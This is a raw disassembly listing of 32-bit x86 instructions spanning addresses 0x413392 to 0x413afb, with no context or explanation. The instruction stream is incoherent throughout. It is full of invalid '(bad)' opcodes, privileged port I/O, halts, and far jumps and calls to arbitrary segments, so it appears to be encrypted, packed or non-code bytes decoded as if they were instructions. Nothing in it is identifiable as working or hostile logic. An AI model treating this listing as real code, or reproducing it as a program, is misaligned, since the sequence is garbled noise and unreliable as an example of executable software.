  413392:	cmp    DWORD PTR [ebp+0x5b],edx
  413395:	mov    DWORD PTR [edi+0x40],0xe96e27e
  41339c:	stos   BYTE PTR es:[edi],al
  41339d:	add    BYTE PTR [ebp+0x2f],al
  4133a0:	es push 0x72
  4133a3:	nop
  4133a4:	shl    DWORD PTR [ecx],cl
  4133a6:	popa   
  4133a7:	arpl   WORD PTR [esi],dx
  4133a9:	shr    DWORD PTR [esi+0x1abb9a31],cl
  4133af:	js     0x4133e3
  4133b1:	push   edi
  4133b2:	ss in  eax,dx
  4133b4:	or     bl,BYTE PTR [ebx+0x3f445a52]
  4133ba:	sub    al,0x37
  4133bc:	push   ebx
  4133bd:	and    cl,BYTE PTR [edx+0x6759d6a8]
  4133c3:	sar    DWORD PTR [esi-0xf],0xa0
  4133c7:	popf   
  4133c8:	jne    0x41334e
  4133ca:	xor    cl,0x39
  4133cd:	cmp    eax,0xadd14712
  4133d2:	jo     0x4133b3
  4133d4:	xlat   BYTE PTR ds:[ebx]
  4133d5:	jne    0x41336f
  4133d7:	jmp    0x413402
  4133d9:	ret    0x50d5
  4133dc:	sub    dl,dh
  4133de:	out    0x19,eax
  4133e0:	stos   DWORD PTR es:[edi],eax
  4133e1:	mov    ds:0xe58821b4,al
  4133e6:	dec    edi
  4133e7:	inc    ecx
  4133e8:	mov    DWORD PTR [ebx],edx
  4133ea:	jecxz  0x413370
  4133ec:	stos   DWORD PTR es:[edi],eax
  4133ed:	mov    ah,0x42
  4133ef:	stos   BYTE PTR es:[edi],al
  4133f0:	mov    cl,0x7a
  4133f2:	xlat   BYTE PTR ds:[ebx]
  4133f3:	in     eax,dx
  4133f4:	inc    edi
  4133f5:	sbb    al,0x5d
  4133f7:	xchg   DWORD PTR [edx-0xcca4f74],edi
  4133fd:	in     eax,dx
  4133fe:	call   0x65ca:0x67b62d6f
  413405:	sahf   
  413406:	cmp    ch,BYTE PTR [ecx-0x3c7931e8]
  41340c:	cwde   
  41340d:	inc    esi
  41340e:	push   ecx
  41340f:	push   esp
  413410:	mov    ch,BYTE PTR [eax-0x71]
  413413:	mov    BYTE PTR [ebx],cl
  413415:	xchg   ecx,eax
  413416:	ins    DWORD PTR es:[edi],dx
  413417:	out    0xc8,eax
  413419:	xchg   edi,eax
  41341a:	out    0xe8,al
  41341c:	out    dx,eax
  41341d:	xchg   esi,eax
  41341e:	into   
  41341f:	sbb    bh,BYTE PTR [edx+0x6483593d]
  413425:	inc    eax
  413426:	sub    al,BYTE PTR [ebp+0x8]
  413429:	icebp  
  41342a:	dec    esi
  41342b:	ins    BYTE PTR es:[edi],dx
  41342c:	jecxz  0x413456
  41342e:	xchg   ecx,eax
  41342f:	retf   0xdd0e
  413432:	inc    edx
  413433:	jns    0x413402
  413435:	and    eax,DWORD PTR [eax]
  413437:	adc    al,BYTE PTR [esi+eiz*2+0x66]
  41343b:	inc    esi
  41343c:	pop    es
  41343d:	icebp  
  41343e:	mov    bl,BYTE PTR [esi+0x77]
  413441:	jl     0x4134a7
  413443:	add    DWORD PTR [edi+0x54],0x7b
  413447:	xor    esp,DWORD PTR [ecx]
  413449:	jmp    0xb248:0x30b48bd0
  413450:	shl    BYTE PTR [esi+0x279b65ab],0xd3
  413457:	adc    al,0x2c
  413459:	imul   edi,DWORD PTR [ebp+0xd],0x99265fd8
  413460:	cmp    cl,BYTE PTR [esi-0x27]
  413463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413464:	in     al,dx
  413465:	and    bl,BYTE PTR [eax+0x344d798e]
  41346b:	push   ecx
  41346c:	aad    0x8e
  41346e:	xor    dl,BYTE PTR [ebp-0x44]
  413471:	(bad)  
  413472:	popa   
  413473:	push   edi
  413474:	out    0x92,al
  413476:	jg     0x413480
  413478:	sub    eax,0xb61e93d8
  41347d:	mov    DWORD PTR [eax],edi
  41347f:	and    edx,DWORD PTR [ebx-0x25]
  413482:	adc    DWORD PTR [esi],edi
  413484:	dec    esp
  413485:	mov    ch,0x75
  413487:	xchg   edx,eax
  413488:	push   0x68
  41348a:	pop    edx
  41348b:	inc    edi
  41348c:	out    dx,al
  41348d:	mov    edx,0xdafde5ac
  413492:	jbe    0x413472
  413494:	fdiv   st(3),st
  413496:	loop   0x4134ff
  413498:	or     eax,0xb4f82ab1
  41349d:	sub    BYTE PTR [esp+eax*8+0x6b],dh
  4134a1:	push   edx
  4134a2:	fidiv  WORD PTR [esi+0x22]
  4134a5:	and    cl,BYTE PTR [ebx]
  4134a7:	push   cs
  4134a8:	jns    0x413465
  4134aa:	xor    al,ah
  4134ac:	repz sub al,0xc3
  4134af:	dec    esp
  4134b0:	dec    ebx
  4134b1:	daa    
  4134b2:	or     al,BYTE PTR [ebp+0x7d]
  4134b5:	in     eax,dx
  4134b6:	and    BYTE PTR [esi+0x1d],cl
  4134b9:	pop    esp
  4134ba:	or     dh,BYTE PTR [eax]
  4134bc:	ret    0xc0c6
  4134bf:	cmp    eax,0xa77b0aca
  4134c4:	inc    ecx
  4134c5:	xor    ch,bh
  4134c7:	pop    ebp
  4134c8:	xchg   esi,eax
  4134c9:	and    bh,BYTE PTR [esi+0x18ecfc8a]
  4134cf:	call   0x68f5:0x57b1f2d7
  4134d6:	add    al,0xa3
  4134d8:	test   al,0xed
  4134da:	fcomi  st,st(0)
  4134dc:	dec    ebx
  4134dd:	xor    eax,0x976bd24f
  4134e2:	cs cld 
  4134e4:	fdivr  QWORD PTR [edx+0x2a]
  4134e7:	lock stos BYTE PTR es:[edi],al
  4134e9:	sar    DWORD PTR [edi],cl
  4134eb:	lods   eax,DWORD PTR ds:[esi]
  4134ec:	lods   al,BYTE PTR ds:[esi]
  4134ed:	cmovge ecx,ecx
  4134f0:	xor    bh,BYTE PTR [ebp+0x30]
  4134f3:	gs xchg ebp,eax
  4134f5:	mov    esi,DWORD PTR [eax+esi*2-0x43]
  4134f9:	int3   
  4134fa:	enter  0xaaa6,0x55
  4134fe:	xor    DWORD PTR [edi+0x104cc129],eax
  413504:	xchg   DWORD PTR [ebp-0x28],ecx
  413507:	pushf  
  413508:	sbb    cl,BYTE PTR [ecx-0x55]
  41350b:	jnp    0x41351d
  41350d:	adc    DWORD PTR [ebp+0x7b76c84c],ebp
  413513:	in     al,0x4d
  413515:	stos   BYTE PTR es:[edi],al
  413516:	mov    ecx,0xde496c99
  41351b:	ins    DWORD PTR es:[edi],dx
  41351c:	mov    eax,0x35440049
  413521:	fadd   QWORD PTR [ebx-0x14]
  413524:	pop    ss
  413525:	mov    al,ds:0x6f707001
  41352a:	push   esi
  41352b:	sahf   
  41352c:	fidiv  WORD PTR [esi+0x523fbe2e]
  413532:	cmp    esi,DWORD PTR [edi+edi*2-0x4]
  413536:	sbb    eax,0xc2777c11
  41353b:	in     al,dx
  41353c:	imul   edi,DWORD PTR [ebp+0x7561a637],0xffffffdd
  413543:	add    edi,DWORD PTR [ecx+edx*4-0xb]
  413547:	xor    DWORD PTR [ecx+0x1dc57159],esp
  41354d:	mov    ds:0x9125dbc0,eax
  413552:	(bad)  [esi]
  413554:	loop   0x4134dc
  413556:	arpl   WORD PTR [ebx+0x6a4f77c9],si
  41355c:	imul   ebp,DWORD PTR [edx+eax*8+0x190881b8],0x78c4e087
  413567:	je     0x413577
  413569:	sti    
  41356a:	loop   0x4135b9
  41356c:	cmp    BYTE PTR fs:[eax+edx*8],0x37
  413571:	dec    edx
  413572:	int3   
  413573:	sub    eax,0xf9909f08
  413578:	pop    esi
  413579:	xor    eax,0xab61d07b
  41357e:	rol    BYTE PTR [ebx],1
  413580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413581:	fcmovnb st,st(1)
  413583:	pop    ds
  413584:	hlt    
  413585:	pop    edi
  413586:	lea    esi,[esi]
  413588:	push   ebx
  413589:	icebp  
  41358a:	inc    edx
  41358b:	gs sub al,0xce
  41358e:	push   0x73
  413590:	add    eax,0x89ebb8ca
  413595:	push   edi
  413596:	sbb    BYTE PTR [eax+eax*2],bh
  413599:	inc    ebp
  41359a:	sbb    BYTE PTR [esi-0x1f3b8772],al
  4135a0:	pop    ebx
  4135a1:	addr16 cmp ebp,ebp
  4135a4:	dec    edx
  4135a5:	push   eax
  4135a6:	push   esp
  4135a7:	push   es
  4135a8:	add    BYTE PTR [eax+0x59],dh
  4135ab:	xor    dl,BYTE PTR [ebx]
  4135ad:	in     al,0x53
  4135af:	cmp    esi,edx
  4135b1:	or     bh,0xba
  4135b4:	adc    DWORD PTR [edx],ecx
  4135b6:	stos   DWORD PTR es:[edi],eax
  4135b7:	sub    esp,DWORD PTR [eax+0x32]
  4135ba:	clc    
  4135bb:	jo     0x413585
  4135bd:	cmp    eax,edx
  4135bf:	dec    eax
  4135c0:	ins    BYTE PTR es:[edi],dx
  4135c1:	push   es
  4135c2:	xor    DWORD PTR [ebx+ecx*4+0x42],0xd4a21f31
  4135ca:	mov    cl,0x34
  4135cc:	sbb    cl,BYTE PTR [edx+0x71]
  4135cf:	gs (bad) 
  4135d1:	xor    bl,BYTE PTR [eax]
  4135d3:	jle    0x4135e4
  4135d5:	and    ch,al
  4135d7:	mov    ah,0x47
  4135d9:	sub    DWORD PTR [eax+0xb],esp
  4135dc:	test   BYTE PTR [ecx+eax*8],bl
  4135df:	lods   al,BYTE PTR ds:[esi]
  4135e0:	push   edi
  4135e1:	cmp    BYTE PTR [edx-0x2971ead0],ch
  4135e7:	dec    ebx
  4135e8:	cs hlt 
  4135ea:	(bad)  
  4135eb:	push   0x20a186e5
  4135f0:	jae    0x413637
  4135f2:	sub    BYTE PTR ds:[edi-0x1bc078eb],al
  4135f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135fa:	inc    edi
  4135fb:	and    eax,0x12ed9c7a
  413600:	inc    ebx
  413601:	xchg   DWORD PTR [ebx+0x19],ebx
  413604:	pop    es
  413605:	push   ebp
  413606:	not    DWORD PTR [ebp-0xa]
  413609:	jo     0x4135c1
  41360b:	pop    esi
  41360c:	cdq    
  41360d:	or     DWORD PTR [ebp-0x78],ebx
  413610:	jo     0x413609
  413612:	sbb    BYTE PTR [edi-0x41],al
  413615:	stos   BYTE PTR es:[edi],al
  413616:	xchg   edx,eax
  413617:	cmp    ch,0x3c
  41361a:	jmp    0x4135a6
  41361c:	sbb    edi,ebp
  41361e:	xor    BYTE PTR [ecx+0x6e],ah
  413621:	xchg   BYTE PTR [edi],bl
  413623:	ficomp DWORD PTR [edi+eax*1]
  413626:	push   ss
  413627:	cwde   
  413628:	sub    DWORD PTR [ecx-0x57],esi
  41362b:	jb     0x4135fa
  41362d:	inc    ebx
  41362e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41362f:	dec    ebx
  413630:	jae    0x41363d
  413632:	pop    ebp
  413633:	cmp    cl,BYTE PTR [ecx-0x469f23b5]
  413639:	or     eax,0x6ff98b42
  41363e:	jp     0x413668
  413640:	inc    edi
  413641:	push   ebx
  413642:	jl     0x413662
  413644:	outs   dx,BYTE PTR ds:[esi]
  413645:	lods   eax,DWORD PTR ds:[esi]
  413646:	outs   dx,BYTE PTR ds:[esi]
  413647:	push   0xffffffd6
  413649:	setg   BYTE PTR [eax+0xc13baf1]
  413650:	mov    edi,0x37dcce09
  413655:	add    eax,0xdaea6ada
  41365a:	stos   BYTE PTR es:[edi],al
  41365b:	(bad)  
  41365c:	cmp    cl,al
  41365e:	fwait
  41365f:	stos   DWORD PTR es:[edi],eax
  413660:	aas    
  413661:	push   esp
  413662:	ss pop ebp
  413664:	ins    DWORD PTR es:[edi],dx
  413665:	outs   dx,BYTE PTR ds:[esi]
  413666:	and    eax,DWORD PTR [ecx]
  413668:	popf   
  413669:	retf   
  41366a:	in     al,0xd0
  41366c:	inc    ecx
  41366d:	mov    dh,0xeb
  41366f:	adc    ebx,esp
  413671:	sbb    eax,0x11e53165
  413676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413677:	sbb    eax,0x577c2775
  41367c:	xchg   ch,al
  41367e:	push   edi
  41367f:	or     al,0x2a
  413681:	call   0xfabbf5a6
  413686:	mov    cl,0x69
  413688:	push   es
  413689:	sub    edi,ebp
  41368b:	out    dx,eax
  41368c:	lahf   
  41368d:	cli    
  41368e:	call   0x82b24a83
  413693:	jl     0x41368d
  413695:	add    DWORD PTR [esi],edx
  413697:	mov    bh,0x4f
  413699:	fldcw  WORD PTR [ebx+0x201979e7]
  41369f:	mov    ebx,0xe10f0070
  4136a4:	mov    ch,0x7d
  4136a6:	or     ebp,DWORD PTR [ecx+ecx*8-0x7cf237ea]
  4136ad:	dec    ebp
  4136ae:	sub    eax,DWORD PTR [edi+0x6a]
  4136b1:	cmp    esp,DWORD PTR [ebp+0x5d422f39]
  4136b7:	std    
  4136b8:	mov    ds:0xa85a931a,eax
  4136bd:	popa   
  4136be:	mov    ds:0x7b634a4c,al
  4136c3:	test   DWORD PTR [eax+ebx*2],0xa8b1f119
  4136ca:	push   es
  4136cb:	in     eax,0x95
  4136cd:	int3   
  4136ce:	adc    BYTE PTR [esi],ch
  4136d0:	mov    ch,0x9e
  4136d2:	add    al,BYTE PTR [ebp+0x32d77088]
  4136d8:	jg     0x413661
  4136da:	outs   dx,DWORD PTR ds:[esi]
  4136db:	arpl   WORD PTR [eax],bx
  4136dd:	clc    
  4136de:	pusha  
  4136df:	sti    
  4136e0:	icebp  
  4136e1:	or     BYTE PTR [edi+0x72828216],ah
  4136e7:	mov    al,ds:0x3195e0a7
  4136ec:	cs cmc 
  4136ee:	fst    DWORD PTR [edx]
  4136f0:	retf   0xb6a
  4136f3:	xor    DWORD PTR [ebp+0x736671b2],edi
  4136f9:	lods   eax,DWORD PTR ds:[esi]
  4136fa:	sbb    al,0xe2
  4136fc:	dec    DWORD PTR ss:[di]
  413700:	push   esi
  413701:	call   0xa6c:0xa4a40b03
  413708:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41370a:	scas   al,BYTE PTR es:[edi]
  41370b:	mov    al,0x84
  41370d:	jne    0x413726
  41370f:	test   al,0x92
  413711:	cwde   
  413712:	xor    esp,DWORD PTR [ebx+0x4d8785e6]
  413718:	xchg   ecx,eax
  413719:	mov    ebp,DWORD PTR [ebp+0x6c9a6618]
  41371f:	mov    BYTE PTR ds:0x50f91c9d,al
  413725:	cmp    ecx,DWORD PTR [edi-0x46]
  413728:	popf   
  413729:	fnstsw WORD PTR [edi]
  41372b:	xchg   esp,eax
  41372c:	push   esp
  41372d:	test   eax,0x9e44c49f
  413732:	ins    BYTE PTR es:[edi],dx
  413733:	cs stc 
  413735:	ror    BYTE PTR [eax],1
  413737:	unpckhps xmm7,XMMWORD PTR [edi-0x5d]
  41373b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41373c:	mov    al,0x75
  41373e:	ret    
  41373f:	add    DWORD PTR [ebp+edx*2+0x31c29224],esi
  413746:	pop    ss
  413747:	sub    BYTE PTR [eax],dh
  413749:	shl    DWORD PTR [edi],0x8a
  41374c:	imul   ebx,DWORD PTR [ebp-0x6323ebd6],0xfe2a2237
  413756:	dec    edi
  413757:	fdiv   QWORD PTR [esp+ebx*1+0x3f21d3de]
  41375e:	imul   edx,DWORD PTR ds:0x91189f9a,0x2
  413765:	dec    ebx
  413766:	int    0xd3
  413768:	jg     0x4137d0
  41376a:	out    dx,al
  41376b:	sbb    al,0xca
  41376d:	popa   
  41376e:	out    dx,al
  41376f:	out    dx,al
  413770:	mov    ebp,eax
  413772:	add    dh,BYTE PTR [ecx-0x3f]
  413775:	fsubr  DWORD PTR [ebp+0x73]
  413778:	push   0xffffff93
  41377a:	in     eax,0x65
  41377c:	add    dh,BYTE PTR [ebx]
  41377e:	pop    edi
  41377f:	adc    al,0x60
  413781:	xchg   ecx,eax
  413782:	daa    
  413783:	aaa    
  413784:	cmp    BYTE PTR [edx],bl
  413786:	adc    BYTE PTR [ecx],al
  413788:	mov    al,0x97
  41378a:	cmp    edx,ecx
  41378c:	(bad)  
  41378d:	hlt    
  41378e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41378f:	push   ecx
  413790:	pop    eax
  413791:	xchg   ebp,eax
  413792:	inc    esi
  413793:	mov    edi,0xbf1c3b6a
  413798:	les    edx,FWORD PTR [edx+edi*8-0x6]
  41379c:	je     0x4137f0
  41379e:	mov    dl,0xc2
  4137a0:	hlt    
  4137a1:	adc    al,0xad
  4137a3:	and    ebp,ebx
  4137a5:	push   0xffffffe8
  4137a7:	ucomiss xmm4,DWORD PTR [ebx]
  4137aa:	js     0x41376b
  4137ac:	mov    al,ds:0xb7b37cf0
  4137b1:	(bad)  
  4137b2:	add    BYTE PTR [ebx],cl
  4137b4:	or     al,0xef
  4137b6:	add    al,0x68
  4137b8:	sub    al,0x75
  4137ba:	cwde   
  4137bb:	daa    
  4137bc:	pushf  
  4137bd:	jne    0x41380b
  4137bf:	mov    cl,0x64
  4137c1:	add    edx,edi
  4137c3:	or     ecx,esi
  4137c5:	jle    0x41383a
  4137c7:	ss push es
  4137c9:	push   eax
  4137ca:	xor    DWORD PTR [edx-0x46],0xffffffb6
  4137ce:	cdq    
  4137cf:	xchg   esp,eax
  4137d0:	sbb    eax,0xb84dd883
  4137d5:	data16 xor bl,ah
  4137d8:	loope  0x413765
  4137da:	jl     0x413843
  4137dc:	jbe    0x41376f
  4137de:	inc    ecx
  4137df:	mov    al,0x8c
  4137e1:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4137e3:	ss loopne 0x413770
  4137e6:	mov    al,ds:0x623c65ff
  4137eb:	std    
  4137ec:	xchg   ebp,eax
  4137ed:	push   es
  4137ee:	fist   DWORD PTR [ebx+0x4ed52aaa]
  4137f4:	int3   
  4137f5:	cmp    eax,0x582dc3b4
  4137fa:	dec    ecx
  4137fb:	sbb    DWORD PTR [bp+di-0x43],eax
  4137ff:	lods   eax,DWORD PTR ds:[esi]
  413800:	cld    
  413801:	sti    
  413802:	mov    ebx,0xbd9bde4a
  413807:	dec    ebp
  413808:	jb     0x41385c
  41380a:	mov    dh,ch
  41380c:	jecxz  0x41386c
  41380e:	xchg   edx,eax
  41380f:	xchg   ebp,eax
  413810:	lahf   
  413811:	dec    esp
  413812:	imul   BYTE PTR [esi+0x1cb616c1]
  413818:	stos   BYTE PTR es:[edi],al
  413819:	mov    eax,0xf6a585b3
  41381e:	push   es
  41381f:	xchg   DWORD PTR [edx],esi
  413821:	pushf  
  413822:	(bad)  
  413823:	int    0xc2
  413825:	push   eax
  413826:	pop    ebx
  413827:	lock add al,cl
  41382a:	in     al,0x24
  41382c:	push   ebp
  41382d:	pop    edi
  41382e:	mov    ds:0x4697badf,al
  413833:	dec    edx
  413834:	ret    
  413835:	and    ch,0x3f
  413838:	jno    0x413823
  41383a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41383b:	inc    ebx
  41383c:	dec    ebp
  41383d:	into   
  41383e:	shl    BYTE PTR [eax-0x4b9b60f1],0xf6
  413845:	adc    DWORD PTR [ebx+0x7f],edi
  413848:	outs   dx,BYTE PTR ds:[esi]
  413849:	or     dl,BYTE PTR [eax+0x72]
  41384c:	xchg   ecx,eax
  41384d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41384e:	jmp    0x3670ebcd
  413853:	and    BYTE PTR [eax-0x52],bh
  413856:	mov    dl,dl
  413858:	adc    al,0x39
  41385a:	imul   esi,DWORD PTR [edx],0xffffffe5
  41385d:	not    edx
  41385f:	mov    esi,esi
  413861:	out    0x74,eax
  413863:	out    0xf8,al
  413865:	data16 jbe 0x41381c
  413868:	xor    ebx,DWORD PTR [ebp-0x31]
  41386b:	mov    dh,0xd3
  41386d:	arpl   WORD PTR [ecx+esi*4-0x4bc9a1f2],bp
  413874:	mov    ch,0x2b
  413876:	mov    ch,BYTE PTR [edx+0x144ac82b]
  41387c:	mov    edi,0x9389ebc2
  413881:	pop    esi
  413882:	lds    ebx,FWORD PTR [edi+0x7ac0f6e6]
  413888:	pop    ebp
  413889:	mulps  xmm3,XMMWORD PTR [edi-0xa]
  41388d:	push   ss
  41388e:	cmp    al,0xd9
  413890:	(bad)  
  413891:	out    0xa4,al
  413893:	stos   BYTE PTR es:[edi],al
  413894:	aad    0x3a
  413896:	xor    al,0x47
  413898:	mov    al,0xed
  41389a:	and    DWORD PTR [edx],ecx
  41389c:	dec    esp
  41389d:	pop    DWORD PTR [edi+0x5b066c84]
  4138a3:	outs   dx,BYTE PTR ds:[esi]
  4138a4:	inc    eax
  4138a5:	mov    ebp,0x19d93301
  4138aa:	mov    esp,0x7852e061
  4138af:	dec    ebp
  4138b0:	jae    0x41391c
  4138b2:	inc    esp
  4138b3:	rol    DWORD PTR [esp+edi*4+0x3870b992],1
  4138ba:	in     al,dx
  4138bb:	loop   0x413909
  4138bd:	jne    0x4138f7
  4138bf:	push   0xffffffca
  4138c1:	jbe    0x413905
  4138c3:	xchg   eax,ebx
  4138c5:	pop    ecx
  4138c6:	jmp    0xb09020f4
  4138cb:	push   es
  4138cc:	push   ss
  4138cd:	mov    al,ds:0x3015c8a4
  4138d2:	pop    eax
  4138d3:	xor    al,0x31
  4138d5:	mov    ss,eax
  4138d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138d8:	pop    esp
  4138d9:	pop    edi
  4138da:	(bad)
  4138dd:	fs je  0x4138e2
  4138e0:	(bad)  
  4138e1:	fiadd  DWORD PTR [edx]
  4138e3:	in     al,0x3b
  4138e5:	sahf   
  4138e6:	out    dx,al
  4138e7:	and    DWORD PTR [esi+0x1f8a78d1],esp
  4138ed:	dec    eax
  4138ee:	and    al,0xc3
  4138f0:	push   ds
  4138f1:	xor    DWORD PTR [ebp-0x62],0xffffff99
  4138f5:	inc    esi
  4138f6:	sub    eax,0x217bcddf
  4138fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138fc:	loop   0x413955
  4138fe:	xchg   BYTE PTR [ecx],dl
  413900:	daa    
  413901:	cs mov dl,0x90
  413904:	int    0xeb
  413906:	aas    
  413907:	cmc    
  413908:	inc    esp
  413909:	adc    bh,BYTE PTR [edx]
  41390b:	dec    esp
  41390c:	mov    dh,0x10
  41390e:	mov    eax,0x33d08935
  413913:	data16 ja 0x4138be
  413916:	adc    ecx,DWORD PTR [esi-0x1b]
  413919:	sub    al,0xe6
  41391b:	imul   ebp,DWORD PTR [esp+ebp*2],0x3
  41391f:	xor    DWORD PTR [ecx+0x1556fb9a],esi
  413925:	push   ebp
  413926:	inc    DWORD PTR [edx+0x11]
  413929:	push   edx
  41392a:	sbb    cl,BYTE PTR [ebx]
  41392c:	pop    ecx
  41392d:	fnsave [esi-0x77f3934f]
  413933:	dec    esp
  413934:	js     0x4138c4
  413936:	jae    0x4138de
  413938:	jnp    0x4139b7
  41393a:	push   ds
  41393b:	ins    DWORD PTR es:[edi],dx
  41393c:	push   esi
  41393d:	and    ah,BYTE PTR [edi+ecx*4-0x3d6b0982]
  413944:	das    
  413945:	add    BYTE PTR [ebx],ch
  413947:	cmp    al,0x1a
  413949:	add    edi,ecx
  41394b:	bound  edi,QWORD PTR [ecx+0xe0cee99]
  413951:	test   BYTE PTR [esi-0x73eed59d],ch
  413957:	mov    ah,0x6d
  413959:	popa   
  41395a:	stos   DWORD PTR es:[edi],eax
  41395b:	mov    esp,0x13f00475
  413960:	ins    DWORD PTR es:[edi],dx
  413961:	sub    BYTE PTR [edi-0x7a],0x54
  413965:	cmp    al,0xe4
  413967:	xor    DWORD PTR [edx+0x3b],esi
  41396a:	hlt    
  41396b:	pop    ds
  41396c:	xchg   ebx,eax
  41396d:	inc    esp
  41396e:	shr    DWORD PTR [ecx+edi*4],1
  413971:	push   edx
  413972:	pushw  0xffb5
  413975:	mov    edx,0xc0bb72a5
  41397a:	cld    
  41397b:	test   DWORD PTR [edx],eax
  41397d:	adc    BYTE PTR [eax+esi*2],0x9a
  413981:	pop    edi
  413982:	pop    ss
  413983:	push   es
  413984:	test   BYTE PTR [eax],cl
  413986:	jmp    0x413980
  413988:	lods   al,BYTE PTR ds:[esi]
  413989:	call   0xe5af6063
  41398e:	hlt    
  41398f:	lds    ebp,FWORD PTR [ecx+0x355bdfa9]
  413995:	and    eax,0x6cef9338
  41399a:	push   cs
  41399b:	cs cld 
  41399d:	aas    
  41399e:	lea    ebp,[edx-0x3c]
  4139a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139a2:	jno    0x4139e0
  4139a4:	inc    esp
  4139a5:	in     eax,0xbb
  4139a7:	aaa    
  4139a8:	jno    0x41393e
  4139aa:	dec    ecx
  4139ab:	and    BYTE PTR [ebx-0x7a],bh
  4139ae:	cs jno 0x4139db
  4139b1:	mov    ebx,0x2fa3a00b
  4139b6:	push   cs
  4139b7:	sbb    DWORD PTR ds:0x1e478826,0xffffff9c
  4139be:	cmp    ecx,DWORD PTR [edx+0x51]
  4139c1:	loope  0x4139ca
  4139c3:	mov    bh,BYTE PTR [edx+edi*8-0x30]
  4139c7:	fisttp WORD PTR [ecx]
  4139c9:	hlt    
  4139ca:	jmp    0x413a0e
  4139cc:	cdq    
  4139cd:	sbb    DWORD PTR [edx],edi
  4139cf:	xchg   edi,eax
  4139d0:	xchg   ebp,eax
  4139d1:	inc    ecx
  4139d2:	mov    esp,0x23a01778
  4139d7:	fwait
  4139d8:	mov    esi,0x7892e283
  4139dd:	int3   
  4139de:	xchg   bl,al
  4139e0:	xor    bl,dl
  4139e2:	ror    BYTE PTR [edi+eax*2+0x4e],1
  4139e6:	jge    0x413a42
  4139e8:	sbb    dl,cl
  4139ea:	fisubr WORD PTR [ecx-0x4d880c6d]
  4139f0:	sar    DWORD PTR [esi-0x10d16caf],cl
  4139f6:	call   0xb7c4:0x7f524f06
  4139fd:	out    dx,eax
  4139fe:	sub    eax,0x3b5bb476
  413a03:	mov    edi,0x82c93646
  413a08:	cmp    edx,DWORD PTR [ebp-0x772c4269]
  413a0e:	(bad)
  413a12:	shl    BYTE PTR [eax-0x376f6568],1
  413a18:	bound  esi,QWORD PTR [ecx+ebp*2-0x7e9079f5]
  413a1f:	ins    BYTE PTR es:[edi],dx
  413a20:	scas   al,BYTE PTR es:[edi]
  413a21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a22:	sbb    ebp,DWORD PTR [ebx+ebx*2-0x62]
  413a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a27:	scas   al,BYTE PTR es:[edi]
  413a28:	mov    DWORD PTR [eax+ebp*2+0x6c850d52],0xd167315e
  413a33:	dec    ebx
  413a34:	scas   eax,DWORD PTR es:[edi]
  413a35:	imul   ebx,DWORD PTR [esi+edi*1+0x3b74fc2b],0xffffffa5
  413a3d:	jmp    0x413aa9
  413a3f:	test   al,0xea
  413a41:	jne    0x413a5d
  413a43:	push   ds
  413a44:	cmp    BYTE PTR [ebx],0x42
  413a47:	mov    dl,dl
  413a49:	dec    edx
  413a4a:	(bad)  
  413a4b:	pop    edx
  413a4c:	xor    eax,0x1096017c
  413a51:	std    
  413a52:	ss inc eax
  413a54:	fs ss jmp 0x23474a7d
  413a5b:	cs push eax
  413a5d:	mov    edx,0x6d6e22f3
  413a62:	sub    BYTE PTR [edx],al
  413a64:	cdq    
  413a65:	adc    ecx,DWORD PTR [edi+0x1a]
  413a68:	in     al,0xaf
  413a6a:	and    eax,DWORD PTR [eax]
  413a6c:	imul   edi,edi,0x21e25845
  413a72:	stc    
  413a73:	adc    ecx,DWORD PTR [eax]
  413a75:	loopne 0x413a74
  413a77:	and    al,0xf4
  413a79:	pop    ss
  413a7a:	jae    0x413a5a
  413a7c:	pop    edx
  413a7d:	jno    0x413acd
  413a7f:	pushf  
  413a80:	xchg   ebx,eax
  413a81:	sub    DWORD PTR [eax+0x6c166c9d],edi
  413a87:	stos   BYTE PTR es:[edi],al
  413a88:	pop    ebp
  413a89:	lahf   
  413a8a:	push   cs
  413a8b:	and    DWORD PTR [edx+0x8e64847],edi
  413a91:	inc    ecx
  413a92:	jne    0x413a2f
  413a94:	pusha  
  413a95:	fs sub al,0x54
  413a98:	xchg   ebx,eax
  413a99:	aad    0x7c
  413a9b:	cmp    esi,DWORD PTR [esi+0x78457c42]
  413aa1:	sub    BYTE PTR [edi],bl
  413aa3:	mov    esp,0x81c3745c
  413aa8:	jae    0x413a59
  413aaa:	(bad)  
  413aab:	scas   al,BYTE PTR es:[edi]
  413aac:	xchg   esp,eax
  413aad:	data16 jno 0x413a47
  413ab0:	call   0xac0:0x19562887
  413ab7:	outs   dx,BYTE PTR ds:[esi]
  413ab8:	jae    0x413b2d
  413aba:	stos   BYTE PTR es:[edi],al
  413abb:	clc    
  413abc:	fist   DWORD PTR [edx]
  413abe:	bound  edi,QWORD PTR [ecx-0x4d00d10]
  413ac4:	pop    edi
  413ac5:	cmp    cl,bl
  413ac7:	mov    ds:0xef259f6a,al
  413acc:	and    al,BYTE PTR [ecx-0x65]
  413acf:	cs xchg esp,eax
  413ad1:	mov    bh,bl
  413ad3:	jecxz  0x413ae1
  413ad5:	push   esi
  413ad6:	or     edx,DWORD PTR [esi-0x7e49b1e8]
  413adc:	mov    al,BYTE PTR ds:0xf179a7ea
  413ae2:	pop    ebp
  413ae3:	shr    BYTE PTR ds:0xf875d53f,cl
  413ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413aea:	adc    ebp,DWORD PTR [edi-0x62076aa1]
  413af0:	scas   al,BYTE PTR es:[edi]
  413af1:	retf   
  413af2:	pop    eax
  413af3:	arpl   WORD PTR [eax+0x6f],dx
  413af6:	cli    
  413af7:	cmp    ebp,DWORD PTR [ebx]
  413af9:	jno    0x413b23
  413afb:	out    0x3a,al
